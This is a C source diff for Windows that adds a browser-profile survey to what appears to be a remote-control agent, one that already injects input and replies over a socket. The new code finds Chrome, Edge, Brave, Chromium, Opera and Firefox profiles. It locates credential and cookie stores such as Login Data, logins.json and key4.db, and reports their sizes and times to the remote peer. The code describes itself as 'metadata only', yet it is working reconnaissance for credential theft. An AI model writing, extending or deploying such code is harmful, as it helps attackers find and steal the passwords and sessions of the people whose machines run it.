@@ -581,3 +581,99 @@ void handle_input(const unsigned char* p, int n) {
         SendInput(1, &in, sizeof(in));
     }
 }
+
+/* ---- browser profile inventory (metadata only, no credential parsing) ---- */
+
+static int browser_env_dir(const char* env, const char* sub, char* out, int cap) {
+    char base[MAX_PATH];
+    DWORD n = GetEnvironmentVariableA(env, base, sizeof(base));
+    if (n == 0 || n >= sizeof(base)) return 0;
+    snprintf(out, (size_t)cap, "%s\\%s", base, sub);
+    return GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES;
+}
+
+static void browser_line(SOCKET s, const char* browser, const char* profile,
+                         const char* item, long long size, long long mtime) {
+    char line[600];
+    int n = snprintf(line, sizeof(line), "%s\t%s\t%s\t%lld\t%lld\n",
+                     browser, profile, item, size, mtime);
+    if (n > 0) send_frame(s, RSP_DATA, (const unsigned char*)line, n);
+}
+
+static int file_stat(const char* path, long long* size, long long* mtime) {
+    WIN32_FILE_ATTRIBUTE_DATA a;
+    ULARGE_INTEGER t;
+    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &a)) return 0;
+    if (a.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) return 0;
+    *size = ((long long)a.nFileSizeHigh << 32) | a.nFileSizeLow;
+    t.LowPart = a.ftLastWriteTime.dwLowDateTime;
+    t.HighPart = a.ftLastWriteTime.dwHighDateTime;
+    *mtime = (long long)(t.QuadPart / 10000000ULL) - 11644473600LL;
+    return 1;
+}
+
+static void browser_profile(SOCKET s, const char* browser, const char* root,
+                            const char* profile, const char* const* files) {
+    char path[MAX_PATH];
+    long long size = 0, mt = 0;
+    int i;
+    for (i = 0; files[i]; i++) {
+        snprintf(path, sizeof(path), "%s\\%s\\%s", root, profile, files[i]);
+        if (!file_stat(path, &size, &mt)) continue;
+        browser_line(s, browser, profile, files[i], size, mt);
+    }
+}
+
+static void browser_version(SOCKET s, const char* browser, const char* root) {
+    char path[MAX_PATH], v[64];
+    HANDLE h;
+    DWORD rd = 0;
+    snprintf(path, sizeof(path), "%s\\Last Version", root);
+    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return;
+    memset(v, 0, sizeof(v));
+    ReadFile(h, v, sizeof(v) - 1, &rd, NULL);
+    CloseHandle(h);
+    while (rd > 0 && (v[rd - 1] == '\n' || v[rd - 1] == '\r' || v[rd - 1] == ' ')) v[--rd] = 0;
+    if (rd == 0) return;
+    browser_line(s, browser, "-", v, 0, 0);
+}
+
+void handle_browser(SOCKET s) {
+    static const struct { const char* name; const char* env; const char* sub; int firefox; } defs[] = {
+        { "Chrome",   "LOCALAPPDATA", "Google\\Chrome\\User Data", 0 },
+        { "Edge",     "LOCALAPPDATA", "Microsoft\\Edge\\User Data", 0 },
+        { "Brave",    "LOCALAPPDATA", "BraveSoftware\\Brave-Browser\\User Data", 0 },
+        { "Chromium", "LOCALAPPDATA", "Chromium\\User Data", 0 },
+        { "Opera",    "APPDATA",      "Opera Software\\Opera Stable", 0 },
+        { "Firefox",  "APPDATA",      "Mozilla\\Firefox\\Profiles", 1 },
+    };
+    static const char* chrome_files[] = {
+        "History", "Bookmarks", "Cookies", "Login Data", "Web Data", "Preferences", NULL
+    };
+    static const char* firefox_files[] = {
+        "places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "prefs.js", NULL
+    };
+    char root[MAX_PATH], pat[MAX_PATH];
+    WIN32_FIND_DATAA fd;
+    HANDLE h;
+    unsigned i;
+    for (i = 0; i < sizeof(defs) / sizeof(defs[0]); i++) {
+        if (!browser_env_dir(defs[i].env, defs[i].sub, root, (int)sizeof(root))) continue;
+        snprintf(pat, sizeof(pat), "%s\\*", root);
+        h = FindFirstFileA(pat, &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+            if (fd.cFileName[0] == '.') continue;
+            if (!defs[i].firefox && strcmp(fd.cFileName, "Default") != 0 &&
+                strncmp(fd.cFileName, "Profile", 7) != 0) continue;
+            browser_profile(s, defs[i].name, root, fd.cFileName,
+                            defs[i].firefox ? firefox_files : chrome_files);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+        if (!defs[i].firefox) browser_version(s, defs[i].name, root);
+    }
+    send_frame(s, RSP_END, NULL, 0);
+}
